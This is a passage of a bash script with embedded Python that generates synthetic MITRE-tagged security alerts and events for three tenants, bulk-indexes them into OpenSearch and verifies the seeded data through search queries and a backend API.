            "actor": random.choice(STATUS_ACTORS)
        })
        current_status = next_status
    return history

def gen_notes(alert_ts_str):
    """Task 1.15: Generate 0-2 analyst notes."""
    notes = []
    num_notes = random.randint(0, 2)
    ts = datetime.strptime(alert_ts_str, "%Y-%m-%dT%H:%M:%S.%fZ").replace(tzinfo=timezone.utc)
    for i in range(num_notes):
        ts = ts + timedelta(minutes=random.randint(10, 180))
        notes.append({
            "id": f"note-{i+1}",
            "body": random.choice(NOTE_BODIES),
            "author": random.choice(NOTE_AUTHORS),
            "visibility": random.choice(["soc", "soc", "team"]),
            "at": ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{random.randint(0,999):03d}Z"
        })
    return notes

def gen_tags(scenario):
    """Task 1.15: Generate 2-4 realistic tags based on scenario."""
    # Start with scenario-relevant tags
    scenario_id = scenario["id"]
    relevant = []
    if "phishing" in scenario_id:
        relevant.append("phishing")
    if "lateral" in scenario_id:
        relevant.append("lateral-movement")
    if "creds" in scenario_id or "bruteforce" in scenario_id:
        relevant.append("credential-access")
    if "c2" in scenario_id or "malware" in scenario_id:
        relevant.append("c2-beacon")
    if "exfil" in scenario_id:
        relevant.append("data-exfil")
    if "evasion" in scenario_id:
        relevant.append("defense-evasion")
    if "impact" in scenario_id:
        relevant.append("ransomware")
    if "persist" in scenario_id:
        relevant.append("persistence")
    if "exec" in scenario_id:
        relevant.append("powershell")
    # Fill to 2-4 tags
    remaining = [t for t in TAGS_POOL if t not in relevant]
    num_tags = random.randint(2, 4)
    while len(relevant) < num_tags:
        relevant.append(random.choice(remaining))
        remaining = [t for t in remaining if t not in relevant]
    return relevant[:num_tags]

def gen_events_for_alert(alert_id, correlation_id, scenario, stage_idx, base_time, tenant_prefix):
    """
    Tasks 1.7, 1.8, 1.9, 1.14: Generate 5-20 events for an alert.
    Events have ECS fields, reference alert.id and correlation.id,
    span 2-6 MITRE tactics, and cluster within 1-30 minute windows.
    """
    num_events = random.randint(5, 20)
    events = []
    stage = scenario["stages"][stage_idx]
    
    # Get additional tactics from the scenario for multi-tactic coverage (Task 1.9)
    all_tactics = [s["tactic_id"] for s in scenario["stages"]]
    # Ensure we span 2-6 tactics by including scenario stages + some extras
    extra_tactics = ["TA0002", "TA0005", "TA0007", "TA0003", "TA0006", "TA0011"]
    available_tactics = list(set(all_tactics + extra_tactics))
    num_tactics = min(random.randint(2, 6), len(available_tactics))
    used_tactics = all_tactics[:num_tactics] if len(all_tactics) >= num_tactics else (all_tactics + extra_tactics[:num_tactics - len(all_tactics)])
    
    # Primary host/user for this alert
    host = random.choice(HOSTNAMES)
    user = random.choice(USERNAMES)
    src_ip = random.choice(INTERNAL_IPS)
    dst_ip = random.choice(EXTERNAL_IPS)
    
    for evt_idx in range(num_events):
        # Cluster timestamps within 1-30 min window (Task 1.14)
        evt_time = base_time + timedelta(minutes=random.uniform(1, 30) * (evt_idx / max(num_events, 1)))
        
        # Rotate through tactics
        tactic_idx = evt_idx % len(used_tactics)
        tactic_id = used_tactics[tactic_idx]
        
        # Find matching technique
        matching_stage = None
        for s in scenario["stages"]:
            if s["tactic_id"] == tactic_id:
                matching_stage = s
                break
        
        if matching_stage is None:
            # Use a default technique for the extra tactic
            technique_map = {
                "TA0002": ("T1059.001", "PowerShell"),
                "TA0003": ("T1547.001", "Registry Run Keys / Startup Folder"),
                "TA0005": ("T1218.011", "Rundll32"),
                "TA0006": ("T1110.001", "Password Guessing"),
                "TA0007": ("T1046", "Network Service Discovery"),
                "TA0011": ("T1071.001", "Web Protocols")
            }
            tech_id, tech_name = technique_map.get(tactic_id, ("T1059.001", "PowerShell"))
            tactic_name_map = {
                "TA0002": "Execution", "TA0003": "Persistence",
                "TA0005": "Defense Evasion", "TA0006": "Credential Access",
                "TA0007": "Discovery", "TA0011": "Command and Control"
            }
            tactic_name = tactic_name_map.get(tactic_id, "Execution")
        else:
            tech_id = matching_stage["technique_id"]
            tech_name = matching_stage["technique_name"]
            tactic_name = matching_stage["tactic_name"]
        
        # Pick action and category
        actions = EVENT_ACTIONS.get(tactic_id, ["process_created"])
        categories = EVENT_CATEGORIES.get(tactic_id, [["process"]])
        action = random.choice(actions)
        category = random.choice(categories)
        
        proc = random.choice(PROCESS_NAMES)
        cmd_options = COMMAND_LINES.get(proc, [f"{proc} --default"])
        cmd_line = random.choice(cmd_options)
        
        event_doc = {
            "@timestamp": evt_time.strftime("%Y-%m-%dT%H:%M:%S.") + f"{random.randint(0,999):03d}Z",
            "event": {
                "action": action,
                "category": category,
                "kind": "event"
            },
            "process": {
                "name": proc,
                "pid": random.randint(1000, 65000),
                "command_line": cmd_line
            },
            "source": {"ip": src_ip if evt_idx % 3 != 0 else random.choice(EXTERNAL_IPS)},
            "destination": {
                "ip": dst_ip if evt_idx % 2 == 0 else random.choice(INTERNAL_IPS),
                "port": random.choice([443, 445, 3389, 80, 8080, 53, 8443, 22])
            },
            "host": {"name": host, "os": {"family": "windows"}},
            "user": {"name": user, "domain": "NORTHSTAR"},
            "file": {
                "hash": {"sha256": gen_sha256()},
                "path": random.choice(FILE_PATHS)
            },
            "alert": {"id": alert_id},
            "correlation": {"id": correlation_id},
            "mitre": {
                "tactic": {"id": tactic_id, "name": tactic_name},
                "technique": {"id": tech_id, "name": tech_name}
            }
        }
        events.append(event_doc)
    
    return events

def generate_all_data():
    """
    Main generation function.
    Tasks 1.3-1.15: Generate alerts and events for all tenants.
    """
    alert_ndjson_lines = []
    event_ndjson_lines = []
    
    # Track which date indices we write to
    # Task 1.14: Events span last 72 hours
    date_offsets = [
        NOW,
        NOW - timedelta(hours=24),
        NOW - timedelta(hours=48),
        NOW - timedelta(hours=72)
    ]
    
    scenario_idx = 0  # Rotate through scenarios
    
    for tenant in TENANTS:
        tenant_id = tenant["id"]
        tenant_prefix = tenant["prefix"]
        tenant_label = tenant["label"]
        num_chained_scenarios = tenant["chained_scenarios"]
        num_standalone = tenant["standalone"]
        
        alert_counter = 0
        alerts_per_chain = 4  # 4 alerts per chained scenario
        
        # ─── Chained alerts (4 alerts per scenario chain) ────────────────
        for chain_idx in range(num_chained_scenarios):
            scenario = SCENARIOS[scenario_idx % len(SCENARIOS)]
            scenario_idx += 1
            num_stages = len(scenario["stages"])
            
            # Task 1.6: correlationId format
            correlation_id = f"corr-{scenario['id']}-{tenant_prefix}-{chain_idx + 1}"
            
            # Base time for this chain — spread across 72 hours
            chain_base = NOW - timedelta(hours=random.uniform(6, 72))
            
            for stage_in_chain in range(alerts_per_chain):
                alert_counter += 1
                alert_id = f"INV-{tenant_label.upper()}-{alert_counter:03d}"
                
                # Each alert in chain handles one stage (cycle if more alerts than stages)
                stage_idx = stage_in_chain % num_stages
                stage = scenario["stages"][stage_idx]
                
                host = HOSTNAMES[alert_counter % len(HOSTNAMES)]
                user = USERNAMES[alert_counter % len(USERNAMES)]
                
                # Alert timestamp
                alert_time = chain_base + timedelta(minutes=stage_in_chain * random.randint(15, 60))
                alert_ts = alert_time.strftime("%Y-%m-%dT%H:%M:%S.") + f"{random.randint(0,999):03d}Z"
                alert_date = alert_time.strftime("%Y.%m.%d")
                
                # Alert title from template
                title = scenario["alert_title_template"].replace("{host}", host)
                
                severity_num = SEVERITY_MAP.get(scenario["severity"], 3)
                risk_score = random.randint(65, 95)
                confidence = random.randint(70, 95)
                
                # Task 1.15: statusHistory, notes, tags
                status_history = gen_status_history(alert_ts)
                notes = gen_notes(alert_ts)
                tags = gen_tags(scenario)
                
                # Determine current status
                current_status = 1
                current_status_label = "New"
                if status_history:
                    current_status = status_history[-1]["to"]
                    status_labels = {1: "New", 3: "Acknowledged", 5: "Investigating", 7: "Resolved"}
                    current_status_label = status_labels.get(current_status, "New")
                
                # Build data sources
                data_sources = ["endpoint-logs"]
                if stage["tactic_id"] in ["TA0008", "TA0011", "TA0010"]:
                    data_sources.append("network-traffic")
                if stage["tactic_id"] in ["TA0006"]:
                    data_sources.append("authentication-logs")
                if stage["tactic_id"] in ["TA0001"]:
                    data_sources.append("email-gateway")
                
                alert_doc = {
                    "id": alert_id,
                    "name": title,
                    "description": f"{scenario['name']} detected on {host} by user {user}. {scenario['rule_name']}.",
                    "severity": severity_num,
                    "severityLabel": SEVERITY_LABEL_MAP[severity_num],
                    "status": current_status,
                    "statusLabel": current_status_label,
                    "riskScore": risk_score,
                    "confidence": confidence,
                    "correlationId": correlation_id,
                    "ruleId": f"rule-{scenario['id']}-{stage_idx:02d}",
                    "ruleName": scenario["rule_name"],
                    "ruleDescription": f"Detects {scenario['name'].lower()} activity patterns across endpoint telemetry.",
                    "category": stage["tactic_name"],
                    "dataSources": data_sources,
                    "mitreTacticId": stage["tactic_id"],
                    "mitreTacticName": stage["tactic_name"],
                    "mitreTechniqueId": stage["technique_id"],
                    "mitreTechniqueName": stage["technique_name"],
                    "primaryEntityId": f"host-{host.lower()}",
                    "primaryEntityLabel": host,
                    "assetOwner": user.replace(".", " ").replace("-", " ").title(),
                    "tenantId": tenant_id,
                    "tenantPrefix": tenant_prefix,
                    "visibleBy": [tenant_prefix],
                    "statusHistory": status_history,
                    "notes": notes,
                    "tags": tags,
                    "@timestamp": alert_ts,
                    "version": 1,
                    "relatedAlertCount": alerts_per_chain - 1
                }
                
                # Alert index line (NDJSON)
                alert_index = f"v3-hive-alert-{tenant_prefix}-{alert_date}"
                alert_ndjson_lines.append(json.dumps({"index": {"_index": alert_index, "_id": alert_id}}))
                alert_ndjson_lines.append(json.dumps(alert_doc))
                
                # Generate events for this alert (Task 1.7, 1.8)
                events = gen_events_for_alert(alert_id, correlation_id, scenario, stage_idx, alert_time, tenant_prefix)
                for evt in events:
                    evt_date = datetime.strptime(evt["@timestamp"], "%Y-%m-%dT%H:%M:%S.%fZ").strftime("%Y.%m.%d")
                    evt_index = f"v3-hive-log-{tenant_prefix}-{evt_date}"
                    evt_id = f"evt-{alert_id}-{events.index(evt):03d}"
                    event_ndjson_lines.append(json.dumps({"index": {"_index": evt_index, "_id": evt_id}}))
                    event_ndjson_lines.append(json.dumps(evt))
        
        # ─── Standalone alerts (not part of a chain) ────────────────────
        for standalone_idx in range(num_standalone):
            alert_counter += 1
            alert_id = f"INV-{tenant_label.upper()}-{alert_counter:03d}"
            
            scenario = SCENARIOS[(scenario_idx + standalone_idx) % len(SCENARIOS)]
            # Standalone alerts use the first stage of a scenario
            stage_idx = 0
            stage = scenario["stages"][stage_idx]
            
            # Unique correlationId for standalone (each is its own group)
            correlation_id = f"corr-{scenario['id']}-{tenant_prefix}-standalone-{standalone_idx + 1}"
            
            host = HOSTNAMES[(alert_counter + standalone_idx) % len(HOSTNAMES)]
            user = USERNAMES[(alert_counter + standalone_idx) % len(USERNAMES)]
            
            # Spread standalone alerts across 72 hours
            alert_time = NOW - timedelta(hours=random.uniform(1, 72))
            alert_ts = alert_time.strftime("%Y-%m-%dT%H:%M:%S.") + f"{random.randint(0,999):03d}Z"
            alert_date = alert_time.strftime("%Y.%m.%d")
            
            title = scenario["alert_title_template"].replace("{host}", host)
            
            severity_num = SEVERITY_MAP.get(scenario["severity"], 3)
            risk_score = random.randint(65, 95)
            confidence = random.randint(70, 95)
            
            status_history = gen_status_history(alert_ts)
            notes = gen_notes(alert_ts)
            tags = gen_tags(scenario)
            
            current_status = 1
            current_status_label = "New"
            if status_history:
                current_status = status_history[-1]["to"]
                status_labels = {1: "New", 3: "Acknowledged", 5: "Investigating", 7: "Resolved"}
                current_status_label = status_labels.get(current_status, "New")
            
            data_sources = ["endpoint-logs"]
            if stage["tactic_id"] in ["TA0008", "TA0011", "TA0010"]:
                data_sources.append("network-traffic")
            if stage["tactic_id"] in ["TA0006"]:
                data_sources.append("authentication-logs")
            
            alert_doc = {
                "id": alert_id,
                "name": title,
                "description": f"{scenario['name']} detected on {host} by user {user}. Standalone detection.",
                "severity": severity_num,
                "severityLabel": SEVERITY_LABEL_MAP[severity_num],
                "status": current_status,
                "statusLabel": current_status_label,
                "riskScore": risk_score,
                "confidence": confidence,
                "correlationId": correlation_id,
                "ruleId": f"rule-{scenario['id']}-standalone",
                "ruleName": scenario["rule_name"],
                "ruleDescription": f"Detects {scenario['name'].lower()} activity patterns across endpoint telemetry.",
                "category": stage["tactic_name"],
                "dataSources": data_sources,
                "mitreTacticId": stage["tactic_id"],
                "mitreTacticName": stage["tactic_name"],
                "mitreTechniqueId": stage["technique_id"],
                "mitreTechniqueName": stage["technique_name"],
                "primaryEntityId": f"host-{host.lower()}",
                "primaryEntityLabel": host,
                "assetOwner": user.replace(".", " ").replace("-", " ").title(),
                "tenantId": tenant_id,
                "tenantPrefix": tenant_prefix,
                "visibleBy": [tenant_prefix],
                "statusHistory": status_history,
                "notes": notes,
                "tags": tags,
                "@timestamp": alert_ts,
                "version": 1,
                "relatedAlertCount": 0
            }
            
            alert_index = f"v3-hive-alert-{tenant_prefix}-{alert_date}"
            alert_ndjson_lines.append(json.dumps({"index": {"_index": alert_index, "_id": alert_id}}))
            alert_ndjson_lines.append(json.dumps(alert_doc))
            
            # Generate events for standalone alert
            events = gen_events_for_alert(alert_id, correlation_id, scenario, stage_idx, alert_time, tenant_prefix)
            for evt in events:
                evt_date = datetime.strptime(evt["@timestamp"], "%Y-%m-%dT%H:%M:%S.%fZ").strftime("%Y.%m.%d")
                evt_index = f"v3-hive-log-{tenant_prefix}-{evt_date}"
                evt_id = f"evt-{alert_id}-{events.index(evt):03d}"
                event_ndjson_lines.append(json.dumps({"index": {"_index": evt_index, "_id": evt_id}}))
                event_ndjson_lines.append(json.dumps(evt))
    
    # Output alert NDJSON followed by a separator, then event NDJSON
    # We use "---SEPARATOR---" to split them in the shell
    print("---ALERTS_START---")
    for line in alert_ndjson_lines:
        print(line)
    print("---ALERTS_END---")
    print("---EVENTS_START---")
    for line in event_ndjson_lines:
        print(line)
    print("---EVENTS_END---")

generate_all_data()
PYEOF

if [ ! -s "$ALERT_NDJSON_FILE" ]; then
  fail "Python generation produced no output"
  rm -f "$ALERT_NDJSON_FILE"
  exit 1
fi
success "Generated alert and event data"

# ─── Extract and bulk-insert alerts ──────────────────────────────────────────

info "Indexing alerts into OpenSearch..."

ALERT_PAYLOAD=$(awk '/---ALERTS_START---/{flag=1;next}/---ALERTS_END---/{flag=0}flag' "$ALERT_NDJSON_FILE")

if [ -n "$ALERT_PAYLOAD" ]; then
  # Bulk insert alerts (add trailing newline required by _bulk API)
  printf '%s\n' "$ALERT_PAYLOAD" | ${CURL_OS} -X POST "${OS_URL}/_bulk" \
    -H "${CONTENT_TYPE_NDJSON}" \
    --data-binary @- 2>/dev/null | python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    items = r.get('items', [])
    errors = r.get('errors', False)
    if errors:
        err_count = sum(1 for i in items if 'error' in i.get('index', i.get('create', {})))
        print(f'  Indexed {len(items)} alerts ({err_count} errors)')
    else:
        print(f'  Indexed {len(items)} alerts successfully')
except:
    print('  Alert bulk insert completed')
"
  success "Alerts indexed"
else
  fail "No alert payload generated"
  exit 1
fi

echo ""

# ─── Extract and bulk-insert events ─────────────────────────────────────────

info "Indexing events into OpenSearch..."

EVENT_PAYLOAD=$(awk '/---EVENTS_START---/{flag=1;next}/---EVENTS_END---/{flag=0}flag' "$ALERT_NDJSON_FILE")

if [ -n "$EVENT_PAYLOAD" ]; then
  # Events can be large — split into chunks of 500 lines (250 docs) for bulk API
  echo "$EVENT_PAYLOAD" | split -l 500 - /tmp/ha_events_chunk_

  CHUNK_COUNT=0
  for chunk_file in /tmp/ha_events_chunk_*; do
    CHUNK_COUNT=$((CHUNK_COUNT + 1))
    printf '%s\n' "$(cat "$chunk_file")" | ${CURL_OS} -X POST "${OS_URL}/_bulk" \
      -H "${CONTENT_TYPE_NDJSON}" \
      --data-binary @- 2>/dev/null | python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    items = r.get('items', [])
    errors = r.get('errors', False)
    if errors:
        err_count = sum(1 for i in items if 'error' in i.get('index', i.get('create', {})))
        print(f'  Chunk: Indexed {len(items)} events ({err_count} errors)')
    else:
        print(f'  Chunk: Indexed {len(items)} events')
except:
    print('  Event chunk insert completed')
"
    rm -f "$chunk_file"
  done
  success "Events indexed (${CHUNK_COUNT} chunks)"
else
  fail "No event payload generated"
  exit 1
fi

echo ""

# ─── Task 1.17: Verification — Query alert exists ────────────────────────────

info "Verifying seeded data..."

# Refresh indices so docs are searchable
${CURL_OS} -X POST "${OS_URL}/v3-hive-alert-*/_refresh" 2>/dev/null > /dev/null
${CURL_OS} -X POST "${OS_URL}/v3-hive-log-*/_refresh" 2>/dev/null > /dev/null

# Verify first CWM alert exists
VERIFY_ALERT_ID="INV-CWM-001"
VERIFY_RESULT=$(${CURL_OS} -X POST "${OS_URL}/v3-hive-alert-*/_search" \
  -H "${CONTENT_TYPE}" \
  -d "{\"query\":{\"term\":{\"id.keyword\":\"${VERIFY_ALERT_ID}\"}},\"size\":1}" 2>/dev/null)

ALERT_FOUND=$(echo "$VERIFY_RESULT" | python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    hits = r.get('hits', {}).get('total', {}).get('value', 0)
    if hits > 0:
        doc = r['hits']['hits'][0]['_source']
        print(f'FOUND: {doc[\"id\"]} - {doc[\"name\"][:60]}...')
        print(f'  Severity: {doc[\"severityLabel\"]}, Status: {doc[\"statusLabel\"]}')
        print(f'  CorrelationId: {doc[\"correlationId\"]}')
        print(f'  MITRE: {doc[\"mitreTacticName\"]} / {doc[\"mitreTechniqueName\"]}')
    else:
        print('NOT_FOUND')
except Exception as e:
    print(f'ERROR: {e}')
" 2>/dev/null)

if echo "$ALERT_FOUND" | grep -q "FOUND"; then
  success "Alert verification passed"
  echo "  $ALERT_FOUND" | head -5
else
  warn "Alert verification: ${VERIFY_ALERT_ID} not found (cluster may not be running)"
fi

echo ""

# ─── Task 1.18: Verify event count per alert ────────────────────────────────

EVENT_COUNT_RESULT=$(${CURL_OS} -X POST "${OS_URL}/v3-hive-log-*/_count" \
  -H "${CONTENT_TYPE}" \
  -d "{\"query\":{\"term\":{\"alert.id.keyword\":\"${VERIFY_ALERT_ID}\"}}}" 2>/dev/null)

EVENT_COUNT=$(echo "$EVENT_COUNT_RESULT" | python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    count = r.get('count', 0)
    print(count)
except:
    print('0')
" 2>/dev/null)

if [ "$EVENT_COUNT" -ge 5 ] && [ "$EVENT_COUNT" -le 20 ] 2>/dev/null; then
  success "Event count verification passed: ${EVENT_COUNT} events for ${VERIFY_ALERT_ID} (expected 5-20)"
elif [ "$EVENT_COUNT" -gt 0 ] 2>/dev/null; then
  warn "Event count for ${VERIFY_ALERT_ID}: ${EVENT_COUNT} (expected 5-20)"
else
  warn "Event count verification: no events found for ${VERIFY_ALERT_ID} (cluster may not be running)"
fi

echo ""

# ─── Task 1.17 (continued): Backend API verification ─────────────────────────

JWT_TOKEN=$(get_backend_token)

if [ -n "$JWT_TOKEN" ]; then
  info "Verifying via Backend API..."
  
  API_RESULT=$(curl -s --max-time 10 -X GET "${BACKEND_API}/ha-alerts/${VERIFY_ALERT_ID}" \
    -H "Authorization: Bearer ${JWT_TOKEN}" \
    -H "${CONTENT_TYPE}" 2>/dev/null || echo "")
  
  if [ -n "$API_RESULT" ] && echo "$API_RESULT" | python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    if 'id' in r:
        sys.exit(0)
    sys.exit(1)
except:
    sys.exit(1)
" 2>/dev/null; then
    success "Backend API verification passed: GET /ha-alerts/${VERIFY_ALERT_ID} returns valid response"
  else
    warn "Backend API verification: alert not accessible via API (may need backend rebuild)"
  fi
else
  info "Skipping Backend API verification (not reachable)"
fi

echo ""

# ─── Summary ─────────────────────────────────────────────────────────────────

# Cleanup temp file
rm -f "$ALERT_NDJSON_FILE"

echo "═══════════════════════════════════════════════════════════════════════════"
echo ""
success "Seeding complete!"
echo ""
echo "  Tenants seeded:"
echo "    • CWM       (id=3813): 20 alerts (4 chains × 4 + 4 standalone)"
echo "    • Workmates1 (id=3812): 15 alerts (3 chains × 4 + 3 standalone)"
echo "    • Workmates2 (id=3814): 15 alerts (3 chains × 4 + 3 standalone)"
echo ""
echo "  Total: 50 alerts with 5-20 events each"
echo "  Alert index pattern: v3-hive-alert-{prefix}-${TODAY}"
echo "  Event index pattern: v3-hive-log-{prefix}-${TODAY}"
echo ""
echo "  Alert ID range: INV-CWM-001..020, INV-WORKMATES1-001..015, INV-WORKMATES2-001..015"
echo "  Each chained alert shares a correlationId with its chain siblings"
echo "  Events span last 72 hours with 1-30 minute clustering per stage"
echo ""
echo "═══════════════════════════════════════════════════════════════════════════"
